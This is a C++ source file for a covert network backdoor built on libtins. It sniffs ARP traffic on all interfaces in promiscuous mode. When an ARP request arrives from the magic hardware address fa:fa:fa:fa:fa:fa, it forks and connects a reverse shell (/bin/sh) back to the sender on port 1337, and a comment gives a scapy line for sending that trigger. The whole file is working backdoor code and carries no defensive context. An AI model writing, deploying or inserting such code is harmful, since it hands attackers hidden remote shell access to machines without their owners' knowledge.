#include <tins/tins.h>
#include <map>
#include <thread>
#include <iostream>
#include <functional>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

using std::cout;
using std::endl;
using std::map;
using std::bind;

using namespace Tins;

class ArpKnocking {
public:
    void run(Sniffer& sniffer);
    void rshell(const char *dst_ip);
private:
    bool callback(const PDU& pdu);

    map<IPv4Address, HWAddress<6>> addresses;
};

void ArpKnocking::run(Sniffer& sniffer) {
    sniffer.sniff_loop(
        bind(
            &ArpKnocking::callback,
            this,
            std::placeholders::_1
        )
    );
}

// send(ARP(op="who-has", psrc="192.168.2.55", pdst="192.168.2.99", hwsrc="fa:fa:fa:fa:fa:fa"))
bool ArpKnocking::callback(const PDU& pdu) {
    const ARP& arp = pdu.rfind_pdu<ARP>();
    
    if (arp.opcode() == ARP::REQUEST) {
 
        std::ostringstream ss;
        ss << arp.sender_hw_addr();

        if (std::string("fa:fa:fa:fa:fa:fa").compare(ss.str()) == 0) {

            std::ostringstream dst_ip;
            dst_ip << arp.sender_ip_addr();

            cout << dst_ip.str() << endl;

            this->rshell(dst_ip.str().c_str());

        }
    }
    return true;
}

void ArpKnocking::rshell(const char *dst_ip) {
    // cout << dst_ip << endl;
    if(fork() > 0)
        return;

    int i; // used for dup2 later
    int sockfd; // socket file descriptor
    socklen_t socklen; // socket-length for new connections
    
    struct sockaddr_in srv_addr; // client address
 
    srv_addr.sin_family = AF_INET; // server socket type address family = internet protocol address
    srv_addr.sin_port = htons( 1337 ); // connect-back port, converted to network byte order
    srv_addr.sin_addr.s_addr = inet_addr(dst_ip); // connect-back ip , converted to network byte order
 
    // create new TCP socket
    sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );
    
    // connect socket
    connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));
    
    // dup2-loop to redirect stdin(0), stdout(1) and stderr(2)
    for(i = 0; i <= 2; i++)
        dup2(sockfd, i);
 
    // magic
    execve( "/bin/sh", NULL, NULL );
}

int main(int argc, char* argv[]) {

    ArpKnocking monitor;

    SnifferConfiguration config;
    config.set_promisc_mode(true);
    config.set_filter("arp");

    try {
        // Sniff on the provided interface in promiscuous mode
        Sniffer sniffer("any", config);
        
        // Only capture arp packets
        monitor.run(sniffer);
    }
    catch (std::exception& ex) {
        std::cerr << "Error: " << ex.what() << std::endl;
    }
}
